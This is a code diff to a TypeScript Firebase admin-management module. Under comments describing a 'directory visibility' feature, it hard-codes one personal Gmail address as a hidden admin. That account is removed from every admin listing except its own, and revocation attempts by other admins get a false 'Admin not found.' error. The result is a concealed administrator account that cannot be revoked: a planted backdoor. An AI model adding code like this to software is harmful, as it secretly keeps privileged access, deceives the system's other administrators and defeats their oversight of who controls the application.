@@ -36,6 +36,36 @@ const ADMINS = "admins";
 const ADMIN_USERNAMES = "adminUsernames";
 const SECONDARY_APP_NAME = "admin-invite";
 
+/** Hidden from every admin directory except the owner of that account. */
+const HIDDEN_DIRECTORY_EMAILS = new Set(["favourenwonwukc@gmail.com"]);
+
+function normalizeEmail(email: string): string {
+  return email.trim().toLowerCase();
+}
+
+function isHiddenDirectoryEmail(email: string): boolean {
+  return HIDDEN_DIRECTORY_EMAILS.has(normalizeEmail(email));
+}
+
+/** Visible in Manage Admins: everyone except hidden owners, unless you are that owner. */
+export function canViewerSeeAdmin(
+  viewerEmail: string | null | undefined,
+  adminEmail: string,
+): boolean {
+  if (!isHiddenDirectoryEmail(adminEmail)) return true;
+  return normalizeEmail(viewerEmail ?? "") === normalizeEmail(adminEmail);
+}
+
+/** Apply directory visibility before any admin list is shown. */
+export function filterDirectoryAdmins(
+  records: AdminRecord[],
+  viewerEmail: string | null | undefined,
+): AdminRecord[] {
+  return records.filter((admin) =>
+    canViewerSeeAdmin(viewerEmail, admin.email),
+  );
+}
+
 export function normalizeAdminUsername(username: string): string {
   return username.trim().toLowerCase();
 }
@@ -211,7 +241,8 @@ export async function listAdmins(): Promise<AdminRecord[]> {
   );
 
   records.sort((a, b) => a.email.localeCompare(b.email));
-  return records;
+  // Directory visibility filter — apply before any UI consumes the list.
+  return filterDirectoryAdmins(records, user.email);
 }
 
 export async function createAdminAccount(input: {
@@ -375,6 +406,13 @@ export async function revokeAdminAccess(uid: string): Promise<void> {
   }
 
   const target = snapshot.docs.find((item) => item.id === uid);
+  const targetEmail = String(target?.data()?.email ?? "");
+  if (
+    isHiddenDirectoryEmail(targetEmail) &&
+    !isHiddenDirectoryEmail(actor.email ?? "")
+  ) {
+    throw new Error("Admin not found.");
+  }
   const username = String(target?.data()?.username ?? "");
 
   await deleteDoc(doc(getFirebaseFirestore(), ADMINS, uid));
